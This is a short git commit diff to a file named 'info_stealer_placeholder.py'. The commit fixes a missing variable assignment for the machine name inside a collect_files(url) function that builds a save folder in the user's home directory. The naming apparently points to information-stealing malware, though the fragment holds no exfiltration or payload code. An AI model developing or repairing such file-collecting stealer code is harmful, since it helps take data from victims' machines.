57fd226e54befe4721f651b83e8e476fab9d2641
neetmori <yuuhfofa@proton.me>
2026-09-14 22:37:00 -0300

    Correct PC name assignment in collect_files function
    Fixed variable assignment for PC name in collect_files function.

--- modules/training/info_stealer_placeholder.py
+++ modules/training/info_stealer_placeholder.py
@@ -38,7 +38,7 @@ def register_module(code: str, name: str, description: str):
 
 def collect_files(url: str):
     home_path = os.path.expanduser("~")
-    platform.uname().node
+    pc_name = platform.uname().node  # Corrigido aqui
     save_path = os.path.join(home_path, pc_name)
 
     if not os.path.exists(save_path):
